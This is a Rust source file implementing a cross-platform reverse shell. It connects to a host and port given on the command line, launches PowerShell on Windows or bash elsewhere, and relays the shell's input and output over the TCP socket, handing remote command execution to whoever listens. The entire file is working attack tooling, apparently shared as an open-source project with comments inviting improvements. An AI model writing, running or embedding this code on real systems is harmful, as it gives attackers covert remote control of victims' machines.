use std::thread;
use std::net::TcpStream;
use std::io::{BufReader, BufWriter, BufRead, Write};
use std::process::{Command, Stdio};
use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() < 3 {
        println!("usage: ./{} host port", &args[0].split("\\").last().unwrap());
    }
    else {
        let host = &args[1];
        let port = &args[2];

        match TcpStream::connect(format!("{}:{}", host, port)) {
            Ok(socket) => {
                let mut tcp_stdin = BufReader::new(socket.try_clone().unwrap());
                let mut tcp_stderr = BufWriter::new(socket.try_clone().unwrap());
                let mut tcp_stdout = BufWriter::new(socket);

                let command = if cfg!(target_os = "windows") {
                    "powershell.exe"
                } else {
                    "/bin/bash"
                };

                let mut process = Command::new(command)
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn().unwrap();

                let mut stdout = BufReader::new(process.stdout.take().unwrap());
                let mut stderr = BufReader::new(process.stderr.take().unwrap());
                let mut stdin = process.stdin.take().unwrap();

                // stdout
                thread::spawn(move || {
                    loop {
                        let mut output = vec![];

                        // read in loop until a space because the last character before the child shell waits for input in stdin again is a space
                        // this is definitely not the cleanest way to do it but I didn't find any other way to read exactly until the child waits for stdin, e.g. read_to_end() create a deadlock and iterate over lines() do not send the last line written on the shell, where we can see again our working directory and make a new command
                        // if you find a better way to do this, feel free to make a pull request
                        stdout.read_until(b' ', &mut output).expect("Failed to read stdout");
                        
                        match tcp_stdout.write(&output) {
                            Ok(0) | Err(_) => break,
                            Ok(_) => tcp_stdout.flush().expect("Failed to flush TCP stdout buffer")
                        }
                    }
                });

                // stderr
                thread::spawn(move || {
                    loop {
                        let mut output = vec![];

                        // almost the same as stdout but this time we're able to read until \n instead of a space, for better buffering
                        stderr.read_until(b'\n', &mut output).expect("Failed to read stderr");
                        
                        match tcp_stderr.write(&output) {
                            Ok(0) | Err(_) => break,
                            Ok(_) => tcp_stderr.flush().expect("Failed to flush TCP stderr buffer")
                        }
                    }
                });

                // stdin
                loop {
                    let mut command = String::new();

                    match tcp_stdin.read_line(&mut command) {
                        Ok(0) | Err(_) => break,
                        Ok(_) => stdin.write_all(command.as_bytes()).expect("Failed to write to stdin")
                    }
                }
            }
            Err(error) => {
                println!("Connection to the socket failed: {}", error);
            }
        }
    }
}